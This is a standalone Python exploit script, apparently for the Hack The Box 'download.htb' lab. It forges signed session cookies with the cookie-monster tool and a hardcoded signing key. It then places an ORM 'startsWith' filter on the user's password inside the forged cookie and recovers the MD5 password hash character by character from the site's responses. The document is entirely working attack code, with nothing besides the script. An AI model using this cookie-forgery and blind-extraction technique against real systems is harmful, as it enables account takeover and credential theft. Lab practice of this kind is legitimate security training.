#!/usr/bin/python3

import re
import requests
import subprocess
import json
from time import sleep

session = requests.session()

def check_html_content(html_string, current_char):
    if 'No files found' not in html_string:
        print(f"{current_char} found!")
        return True
    else:
        print(f"{current_char} not found")
        return False

def exploit():
    md5_chars = "0123456789abcdef"
    filename = "new_cookie.json"
    found_chars = ""
    md5_hash_len = 32 
    
    while len(found_chars) < md5_hash_len:
        for char in md5_chars:
            current_char = found_chars + char
            data = {
                "flashes": {"info": [], "error": [], "success": []},
                "user": {"id": 1, "password": {"startsWith": current_char}}
            }

            with open(filename, 'w') as f:
                json.dump(data, f)

            download_session, download_signature = extract_values(run_cookie_monster())

            url = "http://download.htb:80/home/"
            cookies = {"download_session.sig": f"{download_signature}", "download_session": f"{download_session}"}
            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Referer": "http://download.htb/files/view/85df4556-2702-4750-9111-afa26dc7df36", "Upgrade-Insecure-Requests": "1", "If-None-Match": "W/\"ca2-As8A3i4HoHWvsJbM+yoprTtvfk4\""}
            response = session.get(url, headers=headers, cookies=cookies)

            if response.status_code == 200 and check_html_content(response.text, current_char):
                found_chars = current_char
                break

    print(found_chars)

def run_cookie_monster():
    cmd = "cookie-monster -e -f new_cookie.json -k 8929874489719802418902487651347865819634518936754 -n download_session"
    process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout, stderr = process.communicate()
    
    if process.returncode != 0:
        print(f"Command failed with error {process.returncode}: {stderr.decode()}")
        exit()
    else:
        return stdout.decode()

def extract_values(output_string):
    download_session = None
    download_sig = None

    match_download_session = re.search(r'Data Cookie: download_session=(\S+)', output_string)
    match_download_sig = re.search(r'Signature Cookie: download_session.sig=(\S+)', output_string)

    if match_download_session:
        download_session = re.sub(r'\x1b.*?m$', '', match_download_session.group(1))
    
    if match_download_sig:
        download_sig = re.sub(r'\x1b.*?m$', '', match_download_sig.group(1))
    
    return download_session, download_sig


exploit()